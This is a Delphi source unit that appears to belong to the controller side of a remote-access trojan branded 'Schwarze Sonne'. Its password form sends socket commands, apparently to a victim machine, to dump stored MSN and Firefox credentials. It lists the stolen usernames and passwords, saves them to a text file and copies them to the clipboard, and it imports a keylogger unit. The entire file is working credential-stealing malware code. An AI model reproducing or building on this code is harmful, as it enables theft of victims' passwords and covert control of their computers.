unit uPass;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,winsock,
  Dialogs, ComCtrls, Menus, uKeylogger,ClipBrd;

type
  TForm13 = class(TForm)
    lv1: TListView;
    stat1: TStatusBar;
    pm1: TPopupMenu;
    MSNPasswords1: TMenuItem;
    Firefox1: TMenuItem;
    N1: TMenuItem;
    Clear1: TMenuItem;
    Saveastxt1: TMenuItem;
    SaveDialog1: TSaveDialog;
    N2: TMenuItem;
    CopytoClipboard1: TMenuItem;
    procedure MSNPasswords1Click(Sender: TObject);
    procedure Firefox1Click(Sender: TObject);
    procedure Clear1Click(Sender: TObject);
    procedure Saveastxt1Click(Sender: TObject);
    procedure CopytoClipboard1Click(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form13: TForm13;

implementation

{$R *.dfm}



procedure TForm13.MSNPasswords1Click(Sender: TObject);
var
sock:tSocket;
Data:string;
begin
Data := '44|'+ #10;
Sock := StrToInt(Stat1.Panels[0].Text);
Send(Sock, Data[1], Length(Data), 0);
end;

procedure TForm13.Saveastxt1Click(Sender: TObject);
var
  AFile: TextFile;
  C : Integer;
begin
  if lv1.Items.Count = 0 then exit;
  SaveDialog1.InitialDir := ExtractFilePath(ParamStr(0));
  if not SaveDialog1.Execute then exit;
  AssignFile(AFile, SaveDialog1.FileName);
  ReWrite(AFile);
  WriteLn(AFile, 'Schwarze Sonne Password Recovery ' + '[' + timetostr(time) + ' ' + datetostr(date) + ']');
  WriteLn(AFile, '');
  for C := 0 to lv1.Items.Count - 1 do
  begin
  try
    WriteLn(AFile, '-------------------------------------------------------------');
    if lv1.Items.Item[C].Caption <> '' then
      WriteLn(AFile, 'Type: '+lv1.Items.Item[C].Caption);
    if lv1.Items.Item[C].SubItems[0] <> '' then
      WriteLn(AFile, 'Username: '+lv1.Items.Item[C].SubItems[0]);
    if lv1.Items.Item[C].SubItems[1] <> '' then
      WriteLn(AFile, 'Password: '+lv1.Items.Item[C].SubItems[1]);
    if lv1.Items.Item[C].SubItems[2] <> '' then
      WriteLn(AFile, 'Additional: '+lv1.Items.Item[C].SubItems[2]);
   except
     sleep(1);
  end;
  end;
  CloseFile(AFile);
end;

procedure TForm13.CopytoClipboard1Click(Sender: TObject);
begin
if lv1.Selected = nil then exit;
try
  clipboard.Clear;
clipboard.AsText := lv1.Selected.Caption;
clipboard.AsText := clipboard.AsText + '  ' + lv1.Selected.SubItems.Strings[0];
clipboard.AsText := clipboard.AsText + '  ' + lv1.Selected.SubItems.Strings[1];
clipboard.AsText := clipboard.AsText + '  ' + lv1.Selected.SubItems.Strings[2];
except
end;

end;

procedure TForm13.Firefox1Click(Sender: TObject);
var
sock:tSocket;
Data:string;
begin
Data := '43|'+ #10;
Sock := StrToInt(Stat1.Panels[0].Text);
Send(Sock, Data[1], Length(Data), 0);
end;

procedure TForm13.Clear1Click(Sender: TObject);
begin
lv1.Clear;
end;

end.
